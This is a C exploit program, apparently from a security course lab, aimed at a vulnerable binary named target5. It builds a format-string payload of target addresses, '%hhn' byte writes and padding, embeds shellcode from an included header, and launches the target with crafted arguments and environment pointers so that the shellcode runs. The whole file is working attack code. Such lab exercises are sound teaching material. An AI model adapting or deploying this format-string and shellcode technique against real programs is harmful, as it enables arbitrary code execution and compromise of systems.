#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
	char *args[3];
	char *env[16];
	char attackBuffer[256];
	
	args[0] = TARGET;
	args[1] = attackBuffer;
	memcpy(&attackBuffer[0], "\x68\xfe\x50\x30\x00\x00\x00\x00",8); 
	memcpy(&attackBuffer[8], "AAAAAAAA", 8);
	memcpy(&attackBuffer[16], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);
	memcpy(&attackBuffer[24], "AAAAAAAA", 8);
	memcpy(&attackBuffer[32], "\x6a\xfe\x50\x30\x00\x00\x00\x00", 8);
	memcpy(&attackBuffer[40], "AAAAAAAA", 8);
	memcpy(&attackBuffer[48], "\x6b\xfe\x50\x30\x00\x00\x00\x00", 8);

	memcpy(&attackBuffer[56], shellcode, 45);
	int i;
	
	for (i = 0; i < 4; i ++){
		memcpy(&attackBuffer[101+2*i], "%x", 2);	
	}
	memcpy(&attackBuffer[109], "%086x", 5);
	memcpy(&attackBuffer[114], "%hhn", 4);
	memcpy(&attackBuffer[118], "%097x", 5);	
	memcpy(&attackBuffer[123], "%hhn", 4);
	memcpy(&attackBuffer[127], "%087x", 5);	
	memcpy(&attackBuffer[132], "%hhn", 4);	
	memcpy(&attackBuffer[136], "%0224x", 6);	
	memcpy(&attackBuffer[142], "%hhn", 4);

        for (i = 0; i < 255-146; i ++){
		memcpy(&attackBuffer[146+i], " ", 1);	
	}
	memcpy(&attackBuffer[255], "\x00", 1);

	args[2] = NULL;

	env[0] = &attackBuffer[5];
	env[1] = &attackBuffer[6];
	env[2] = &attackBuffer[7];
	env[3] = &attackBuffer[8];
	env[4] = &attackBuffer[21];
	env[5] = &attackBuffer[22];
	env[6] = &attackBuffer[23];
	env[7] = &attackBuffer[24];
	env[8] = &attackBuffer[37];
	env[9] = &attackBuffer[38];
	env[10] = &attackBuffer[39];
	env[11] = &attackBuffer[40];
	env[12] = &attackBuffer[53];
	env[13] = &attackBuffer[54];
	env[14] = &attackBuffer[55];
	env[15] = &attackBuffer[56];

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
